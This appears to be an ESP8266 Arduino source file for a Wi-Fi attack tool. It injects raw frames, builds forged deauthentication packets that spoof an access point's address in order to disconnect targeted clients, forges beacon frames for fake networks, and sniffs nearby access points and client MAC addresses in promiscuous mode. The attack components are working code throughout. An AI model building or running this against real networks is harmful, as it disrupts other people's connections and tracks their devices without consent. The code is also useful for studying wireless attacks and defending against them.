extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int  wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int  wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

#include <ESP8266WiFi.h>
#include "structures.h"

#define MAX_APS_TRACKED 100
#define MAX_CLIENTS_TRACKED 200

beaconinfo aps_known[MAX_APS_TRACKED];
int apsCount = 0;
int nothing_new = 0;
clientinfo clients_known[MAX_CLIENTS_TRACKED];
int clientsCount = 0;

uint16_t pktCounter = 0;
uint16_t DataPktCounter = 0;
uint16_t tickCounter = 0;

//packet buffer
uint8_t packet[128];
int packetSize;
uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0xFF, 0xFF, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };
uint8_t beaconPacket_header[36] = {
      /*  0 - 1  */ 0x80, 0x00,
      /*  2 - 3  */ 0x00, 0x00, //beacon
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination: broadcast
      /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
      /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
      /* 22 - 23 */ 0xc0, 0x6c,
      /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
      /* 32 - 33 */ 0x64, 0x00, //0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
      /* 34 - 35 */ 0x01, 0x04
                 /*,0x00, 0x06, //SSID size
                    0x72, 0x72, 0x72, 0x72, 0x72, 0x72, //SSID
                    >>beaconPacket_end<<*/
    };
    uint8_t beaconPacket_end[12] = {
      0x01, 0x08, 0x82, 0x84,
      0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01
     /*,channel*/
    };
uint8_t beaconWPA2tag[26] = {
      0x30, //RSN tag
      0x18, //tag length
      0x01, 0x00, //RSN version
      0x00, 0x0f, 0xac, 0x02, //cipher (TKIP)
      0x02, 0x00, //pair cipher
      0x00, 0x0f, 0xac, 0x04, //cipher (AES)
      0x00, 0x0f, 0xac, 0x02, //cipher (TKIP)
      0x01, 0x00, //AKM count
      0x00, 0x0f, 0xac, 0x02, //PSK
      0x00, 0x00 //RSN capabilities
    };

void PrintHex8(uint8_t *data, uint8_t length){
  Serial.print("0x");
  for (int i=0; i<length; i++) {
    if (data[i]<0x10) {Serial.print("0");}
    Serial.print(data[i],HEX);
    Serial.print(" ");
  }
}

bool wifiSend(){
  if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){
/*
      Serial.print(packetSize);
      Serial.print(" : ");
      PrintHex8(packet, packetSize);
      Serial.println("");
*/
    return false;
  }
  delay(1); //less packets are beeing dropped
  return true;
}

void buildBeacon(const uint8_t* apMAC, const String& ssid, int _ch, bool encrypt){
  packetSize = 0;
  int ssidLen = ssid.length();
  if(ssidLen>32) ssidLen = 32;

  for(int i=0;i<sizeof(beaconPacket_header);i++){
    packet[i] = beaconPacket_header[i];
    packetSize++;
  }

  for(int i=0;i<6;i++){
    //set source (AP)
    packet[10+i] = packet[16+i] = apMAC[i];
  }
  
  packet[packetSize] = 0x00;
  packetSize++;
  packet[packetSize] = ssidLen;
  packetSize++;
  
  for(int i=0;i<ssidLen;i++){
    packet[packetSize] = ssid[i];
    packetSize++;
  }

  for(int i=0;i<sizeof(beaconPacket_end);i++){
    packet[packetSize] = beaconPacket_end[i];
    packetSize++;
  }
  
  packet[packetSize] = _ch;
  packetSize++;

  if(encrypt){
    for(int i=0;i<sizeof(beaconWPA2tag);i++){
      packet[packetSize] = beaconWPA2tag[i];
      packetSize++;  
    }
  }
  
}

void buildDeauth(const uint8_t* apMAC, const uint8_t* cliMAC, uint8_t type, uint16_t reason){
  packetSize = 0;
  for(int i=0;i<sizeof(deauthPacket);i++){
    packet[i] = deauthPacket[i];
    packetSize++;
  }

  for(int i=0;i<6;i++){
    //set target (client)
    packet[4+i] = cliMAC[i];
    //set source (AP)
    packet[10+i] = packet[16+i] = apMAC[i];
  }

	//packet[0] = type;
	//packet[24] = reason;
}

int register_beacon(beaconinfo beacon)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < apsCount; u++)
  {
    if (! memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN)) {
		memcpy(&aps_known[u], &beacon, sizeof(beacon));
      known = 1;
      break;
    }   // AP known => Set known flag
  }
  if (! known)  // AP is NEW, copy MAC to array and return it
  {
    memcpy(&aps_known[apsCount], &beacon, sizeof(beacon));
    apsCount++;

    if ((unsigned int) apsCount >=
        sizeof (aps_known) / sizeof (aps_known[0]) ) {
      Serial.printf("exceeded max aps_known\n");
      apsCount = 0;
    }
  }
  return known;
}

int register_client(clientinfo ci)
{
  int known = 0;   // Clear known flag
  for (int u = 0; u < clientsCount; u++)
  {
    if (! memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) {
		memcpy(&clients_known[u], &ci, sizeof(ci));
      known = 1;
      break;
    }
  }
  if (! known)
  {
    memcpy(&clients_known[clientsCount], &ci, sizeof(ci));
    clientsCount++;

    if ((unsigned int) clientsCount >=
        sizeof (clients_known) / sizeof (clients_known[0]) ) {
      Serial.printf("exceeded max clients_known\n");
      clientsCount = 0;
    }
  }
  return known;
}

void print_beacon(beaconinfo beacon)
{
  if (beacon.err != 0) {
    //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
  } else {
    Serial.printf("BEACON: <=============== [%32s]  ", beacon.ssid);
    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
    Serial.printf("   %2d", beacon.channel);
    Serial.printf("   %4d\r\n", beacon.rssi);
  }
}

void print_client(clientinfo ci)
{
  int u = 0;
  int known = 0;   // Clear known flag
  if (ci.err != 0) {
    // nothing
  } else {
    Serial.printf("DEVICE: ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.station[i]);
    Serial.printf(" ==> ");

    for (u = 0; u < apsCount; u++)
    {
      if (! memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN)) {
        Serial.printf("[%32s]", aps_known[u].ssid);
        known = 1;     // AP known => Set known flag
        break;
      }
    }

    if (! known)  {
      Serial.printf("   Unknown/Malformed packet \r\n");
      //  for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.bssid[i]);
    } else {
      Serial.printf("%2s", " ");
      for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.ap[i]);
      Serial.printf("  %3d", aps_known[u].channel);
      Serial.printf("   %4d\r\n", ci.rssi);
    }
  }
}

void promisc_cb(uint8_t *buf, uint16_t len)
{
  if (len == 12) {
    struct RxControl *sniffer = (struct RxControl*) buf;
  } else if (len == 128) {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    if (register_beacon(beacon) == 0) {
      //print_beacon(beacon);
      nothing_new = 0;
    }
  } else {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;

	if ((sniffer->buf[0] == 0x08) && (sniffer->buf[1] == 0x42)) DataPktCounter++;
	if ((sniffer->buf[0] == 0x08) && (sniffer->buf[1] == 0x62)) DataPktCounter++;

    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) {
      struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
      if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) {
        if (register_client(ci) == 0) {
          //print_client(ci);
          nothing_new = 0;
        }
      }
    }
  }
}

